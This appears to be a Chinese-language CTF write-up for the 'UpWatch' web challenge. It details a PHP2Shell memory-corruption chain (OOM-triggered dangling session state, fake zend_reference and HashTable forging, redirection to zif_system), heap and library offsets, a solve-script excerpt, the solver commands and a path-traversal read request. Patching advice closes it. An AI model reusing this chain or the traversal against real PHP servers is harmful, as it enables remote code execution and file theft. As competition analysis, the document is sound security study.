# UpWatch — 上传看板

```
> TPCTF 2026 · web · 挑战 ID `AUTHORED-4B9564B9` · 状态 solved
```

## 一句话

UpWatch 是一块极简的文件上传看板：提交一个文件和一句话说明， 看板负责接收、编号、留档和回放。

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `src/README.md` | 507 B | `8482b6cdd7b6…` |
| `src/index.php` | 1.9 KB | `a126c5c97a0f…` |
| `src/upload.php` | 1.5 KB | `ef57dcef872a…` |
| `src/view.php` | 547 B | `13587ab076e4…` |
| `src/healthz.php` | 19 B | `e3f7f317cb3b…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 1. 题面与源码

应用只有三个脚本：

| 文件 | 作用 |
| --- | --- |
| index.php | 扫描 files/，展示 ^[0-9a-f]{32}$ 条目及其 .json 元数据 |
| upload.php | id = bin2hex(random_bytes(16))，move_uploaded_file($_FILES['upload']['tmp_name'], "$dir/$id")，再写 $id.json |
| view.php | $path = __DIR__ . '/files/' . $_GET['f']，只拒绝空串和以 / 开头，is_file() 后 readfile() |

view.php 是任意文件读取（/var/www:/tmp 内），但只能“读”，没有任何 include/eval 之类的执行汇点，上传文件名是随机 hex 且无扩展名，.htaccess 也写不进去。直接读 /var/www/flag.txt 只会拿到诱饵：

«FLAG»

(the real flag is not reachable through any PHP function on this box)

真正的攻击面在配置：

; zz-hard.ini（节选，题面公开）

```js
display_errors=On
error_reporting=E_ALL
memory_limit=16M
post_max_size=16M
upload_max_filesize=16M
session.save_path=/tmp
session.use_strict_mode=0
session.upload_progress.enabled=On
session.upload_progress.cleanup=On
expose_php=0
open_basedir=/var/www:/tmp
```

# prefork.conf

StartServers 1

MinSpareServers 1

MaxSpareServers 1

MaxRequestWorkers 1

ServerLimit 1

MaxConnectionsPerChild 0

session.upload_progress.*=On + /tmp + 16M 内存上限 + 单 worker 且永不回收子进程，恰好是 PHP2Shell 的触发前提。

### 2. 漏洞定位：PHP2Shell

php:8.5.11 比修复版本 8.5.12 低一个补丁。官方通告：

• CVE-2026-109618：OOM 破坏（allocator 里 longjmp 跳过清理，EG() 全局状态残留）
• CVE-2026-109619：跨请求 stale global state（use-after-free），mod_php 下危害最大

修复 commit 31c0ea7（"Avoid state corruption via bailout"）把 OOM bailout 改为 UnwindExit 并重置 EG(delayed_oom)、compiler_globals->interned_strings_fallible 等全局；官方缓解措施正是关闭 session.upload_progress.enabled（8.5 再加 fatal_error_backtraces=0）。题目把这两个开关原样打开，等于把漏洞前置条件写成配置发给选手。

关于本题的利用结构，公开资料（3em0/php2shell、EDB 52704、HTB Dark Embargo 的 writeup）给了两条路线：

1. session 引用链（本题采用）：PS(id) / PS(http_session_vars) 在 OOM bailout 后悬空 → 下一个请求用受控字段重新占位 → php_session_track_init 析构伪造的 zend_reference → zend_array_destroy(fake HashTable) → pDestructor = zif_system。
2. 不完整 HashTable 桶（EDB 52704）：header 洪水让 zend_hash 在桶未完成时 OOM，再伪造 bucket/object/handlers 走 jump_fcontext ROP。

两条都需要针对具体 libphp 构建重算偏移和堆布局；本题是 Debian trixie 的 php:8.5.11-apache，与 Ubuntu 2.4.66 的公开 PoC 偏移不同。

### 3. 环境搭建（本地复现）

docker run -d --name upwatch-local \

--cap-add=SYS_PTRACE --security-opt seccomp=unconfined \

-p 127.0.0.1:8088:80 \

-v $PWD/_dl/rep/www:/var/www/html \

-v $PWD/upwatch/zz-hard.ini:/usr/local/etc/php/conf.d/zz-hard.ini:ro \

-v $PWD/upwatch/prefork.conf:/etc/apache2/conf-enabled/zz-prefork.conf:ro \

docker.m.daocloud.io/library/php:8.5.11-apache

（--cap-add=SYS_PTRACE 只为本地调试：需要读 /proc/<pid>/mem 和 attach gdb。）

取得的构建信息：

• libphp.so：PHP 8.5.11 (NTS)，zif_system = libphp + 0x5996e0，zval_ptr_dtor = libphp + 0x7b47a0，ps_globals = libphp + 0x1771A40
• worker 的 Zend 堆：[anon:zend_alloc] 2 MiB 映射，PS(http_session_vars) 的 zval 在 ps_globals + 0x168

### 4. 利用链

三个 stage 共用一个前提：每个请求后 worker 不退出（MaxConnectionsPerChild 0），所以悬空指针活到下一个请求。

Stage 1 — 泄漏 chunk base

请求 A：

• 1001 个单字节字段 → 触发 max_input_vars 警告，display_errors=On 导致 SG(headers_sent)=1
• PHPSESSID 的值给一个字节 \x00
• PHP_SESSION_UPLOAD_PROGRESS + 一个文件字段 + 一个 12 MiB 的字段

rfc1867 解析在 PHP 代码执行前就分配 session id；随后 php_session_reset_id() 因 headers 已发送而失败，php_session_abort() 使清理被跳过；最后 12 MiB 字段触发 OOM，zend_bailout 直接 longjmp，PS(id) 悬空、send_cookie=1 保留。

请求 B 不带文件字段，upload-progress 的 END 清理会走 php_session_initialize → php_session_reset_id，此时用 urlencode(ZSTR_VAL(PS(id)), ZSTR_LEN(PS(id))) 生成 Set-Cookie。B 的字段先把悬空的 id 块改写成伪造的 zend_string（len 设大），cookie 就变成越界读取，2 MiB 堆里的指针随 cookie 返回；取出现次数最多的 2 MiB 对齐指针即为 chunk base。

Stage 2 — 泄漏 libphp base

同构：让 PS(id) 落在嵌套数组的 HashTable 上，ZSTR_LEN 读到 nTableSize，+0x20 读到 pDestructor（即 zval_ptr_dtor），libphp = leak - 0x7b47a0。

线上实测：chunk = 0x735855600000，libphp = 0x735857000000（2 MiB 对齐，符合预期）。

Stage 3 — 改写 zend_reference 并触发 zif_system

请求 A 用 PHPSESSID=a*19 + 6 个 (31,31) pad + 文件 + big 字段，把 PS(http_session_vars) 指向的 zend_reference（rc=2, type=0x1A, val=IS_ARRAY_EX）留在悬空状态，R0 = PS(http_session_vars)。

请求 B 需要让一个受控字符串的数据正好覆盖 R0，内容是 24 字节：

```
struct.pack('<IIQQ', 1, 0x1A, htdata, 0x307)
```

#                 rc  type  val     val.type=IS_ARRAY_EX

随后 session 初始化时：

php_session_track_init

→ zval_ptr_dtor(PS(http_session_vars))

→ zend_reference_destroy(R0)          # 用我们的 24 字节

→ zend_array_destroy(fake HashTable @ htdata)

→ zend_hash_destroy

→ pDestructor(&bucket->val) = zif_system

pDestructor 只传一个参数（&bucket->val），所以 fake HashTable 里把 &bucket->val 伪装成 zend_execute_data（num_args=1，arg1 指向 fake zend_string），command 就放在那个 string 里。命令受 167 字节 payload 限制，最多 14 字节——刚好够 cp /flag /tmp。

本题唯一的硬骨头：expose_php=0 让原版 carrier 失效

原版（3em0、EDB 52704）用一个 15 字节的 g00 字段承载 24 字节 fake reference，要求这 15 字节落进 R0 所在的 32 字节块。但在 zz-hard.ini 下必失败：

• 逐条指令二分（mx-base / up-v1 成功，up-v2 / upwatch-local 失败）确认唯一破坏者是 expose_php=0：
• 成功配置：R0 = chunk+0x56180，carrier 正好落上
• 失败配置：R0 = chunk+0x68160，carrier 落在 0x690xx/0x5bxxx
• 原因是 expose_php=0 少了 X-Powered-By 头的 SAPI 分配，改变了请求启动阶段的 ZendMM 布局；R0 所在页（0x68）仍是 bin-32 页，且被 A 阶段的字段名字符串（"files", "error", "done", "SID", "charset=UTF-8"）占着，永远不会被重新分配给 bin-40（15 字节）。
• 数学上：15 字节块数据在 block+0x18，要覆盖 R0-0x18，需 (0x160-0x18) % 40 == 0，而 0x148 = 328 只被 8 整除 → bin-40 永远不可能命中 0x68160。

解法：改成 39 字节字段洪水。

• probe_page.py 用干净 B（不带 progress 字段，请求正常结束）测出：900 个 39 字节值（bin-64）会把 0x68 页抢过来，token 数据依次落在 0x68018, 0x68058, …, 0x68158；第 6 个 token 的数据起点 0x68158，它的第 8 字节正好是 R0 = 0x68160。
• 于是 B 变成：PHPSESSID → 899 个 39 字节字段（每个在偏移 8 处放同一段 24 字节 fake reference，val = chunk+0xb3018）→ 15 个 167 字节 fake HashTable → PHP_SESSION_UPLOAD_PROGRESS 放在最后一个字段。
• 顺序很关键：progress 字段若放前面，bin-32 的字段名字符串会先占 0x68 页；放最后才轮到 bin-64 的洪水值。
• htdata 用解析后的副本：raw multipart body 里的 payload 在 0xb300f，PHP 解析后的 zend_string 在 0xb3018（相差 9 字节的 header/对齐），15 份拷贝按 0xE0 步进。

```
gdb 证据（本地 replica，成功时）：
```

REF 0x735855668160        # 我们的 fake reference，正好在 R0

FAKEARR 0x7358556b3018    # zend_array_destroy 收到 htdata

ZIFHIT                    # pDestructor → zif_system

Program received signal SIGSEGV

命令执行结果：uid=33(www-data) gid=33(www-data) groups=33(www-data)。

### 5. 端到端复现

本地（先造一个假 flag 验证整条链）：

docker exec upwatch-local sh -c 'printf "«FLAG»\n" > /flag'

```bash
python _dl/solve.py http://127.0.0.1:8088/index.php --cmd 'cp /flag /tmp'
```

docker exec upwatch-local cat /tmp/flag

# «FLAG»

线上：

# 1) 起 WireGuard（配置来自 /api/v1/instances/<iid>/vpn-config）

wg-quick up upwatch2        # Address 172.16.21.254/32, AllowedIPs 172.16.21.0/24

# 2) 内网 DNS 不响应时直接扫 /24 找应用

#    OPEN 172.16.21.2:80

```bash
curl http://172.16.21.2/healthz.php     # ok
```

# 3) 打

```bash
python3 _dl/solve.py http://172.16.21.2/index.php --cmd 'cp /flag /tmp'
```

# === attempt 1 ===

# chunk=0x735855600000 libphp=0x735857000000

# htdata=0x7358556b3018

# done True

# 4) 用应用自己的目录穿越读回 flag

```bash
curl 'http://172.16.21.2/view.php?f=../../../../tmp/flag'
```

# «FLAG»

view.php 的路径：/var/www/html/files/../../../../tmp/flag → /tmp/flag，在 open_basedir=/var/www:/tmp 之内，所以读得到。

### 6. 关键代码（_dl/solve.py 的 stage-3）

ht, _r = ex._fake_payload(htdata, libphp + ZIF)           # 167B fake HashTable

```
ref = struct.pack('<IIQQ', 1, 0x1A, htdata, 0x307)        # fake zend_reference
bparts = [{"name": "PHPSESSID", "data": E.SID}]
for i in range(899):                                       # 39 字节洪水，bin-64 抢 0x68 页
v = bytearray(b"T%05d" % i + b"y" * 33)
```

v[8:32] = ref

bparts.append({"name": f"c{i:04d}", "data": bytes(v)})

```
for i in range(15):
```

bparts.append({"name": f"h{i:04d}", "data": ht})

bparts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"})  # 必须最后

fake HashTable 布局（_fake_payload）：+0x30 pDestructor = zif_system；fake execute_data 在 +0x20（+0x10 return_value、+0x2C num_args=1、+0x50 arg1.value = htdata+0x80、+0x58 arg1.type=IS_STRING）；fake zend_string 在 +0x80（rc=1, type=0x106, len 在 +0x90，命令在 +0x98）。

### 7. 走过的弯路

• Apache 层的路径穿越（/icons/..%2f..%2f、双编码、%2e%2e）全部被拒，无法绕出 docroot。
• /var/www、/tmp 常见文件名 341 个全 404；/var/www/flag.txt 是诱饵。
• 并发 race（session.upload_progress.cleanup=On 经典打法）不可行：实测单 worker 完全串行（持住一个请求时第二个请求 4 秒超时）。
• 直接读 /tmp/sess_* 也不通：需要先让 session 文件写出且内容可控，而应用没有 include 汇点。
• 原版 15 字节 carrier、各种 pad/SID 长度/额外请求头/huge_mb 调参都不动 R0 的页分配，全部失败；直到改成 bin-64 洪水才解决。
• Windows 侧客户端跑大 POST 不稳定/超时，最终所有线上请求都在 WSL 内直接走 WireGuard 完成。

### 8. 修复建议

• 升级到 PHP 8.5.12（或 8.2.35 / 8.3.36 / 8.4.27）
• 无法升级时：session.upload_progress.enabled=Off（阻断 109619 的生产者），8.5 上再加 fatal_error_backtraces=0；memory_limit=-1 可阻断 109618 的 OOM 破坏
• 纵深防御：prefork 设置 MaxConnectionsPerChild 非 0（定期回收 worker），或直接在 FPM 下隔离
• 应用层：view.php 用 basename()/白名单而不是“只拒绝 / 开头”

## 结果

- flag sha256：`2fdf9116119692f7a9b72b4bc3a096a2f7f13c69d2f824c26a742646db8b3147`, `3f881351532a7e9fc894a25d10c2475211c59686ade8d1aee598bcb26b246fa8`, `4502d3ce4dc6a9cbc287c434120f4b601343b7d139d1451f69561728ddc060ee`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- （未归档脚本，见原始工作目录）

## 待核实

- 本条目由 WP 第 5 节《UpWatch — 上传看板》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
